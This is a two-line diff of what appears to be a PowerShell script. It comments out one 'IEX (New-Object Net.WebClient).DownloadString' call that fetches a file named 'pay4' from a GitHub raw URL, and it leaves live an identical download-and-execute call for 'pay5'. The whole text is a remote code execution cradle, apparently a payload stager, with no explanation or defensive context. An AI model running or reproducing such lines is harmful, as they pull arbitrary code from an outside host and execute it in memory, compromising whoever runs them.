@@ -1,2 +1,2 @@
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay4')
+#IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay4')
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay5')
